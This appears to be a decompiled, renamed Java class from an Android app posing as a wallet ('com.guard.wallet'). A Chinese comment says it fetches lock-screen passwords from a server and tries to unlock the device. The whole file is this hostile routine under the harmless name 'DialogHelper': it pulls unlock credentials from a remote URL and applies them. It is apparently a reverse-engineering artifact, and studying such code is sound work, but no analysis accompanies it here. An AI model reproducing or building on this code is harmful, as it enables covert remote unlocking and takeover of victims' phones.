package com.guard.wallet.helper;

import android.util.Log;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.ApiResult;
import java.util.List;

/**
 * 对话框抽象辅助 — 从服务器获取锁屏密码列表并尝试解锁。
 *
 * vendor 原名: com.guard.wallet.helper.i
 */
public abstract class DialogHelper {
    private static final String TAG = "com.guard.wallet.helper.i";

    public static void a(String url) {
        if (url == null || url.isEmpty()) return;
        try {
            LockCipherHelper$1 callback = new LockCipherHelper$1();
            ApiResult result = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(url, callback);
            if (result == null || !result.getSuccess() || result.getData() == null) return;

            List<?> dataList = (List<?>) result.getData();
            if (dataList.isEmpty()) return;

            for (Object item : dataList) {
                ReqUnlockDeviceVO vo = (ReqUnlockDeviceVO) item;
                if (com.guard.wallet.utils.SharedPrefsManager.t(vo)) {
                    com.guard.wallet.utils.SharedPrefsManager.C(vo);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "error", e);
        }
    }
}
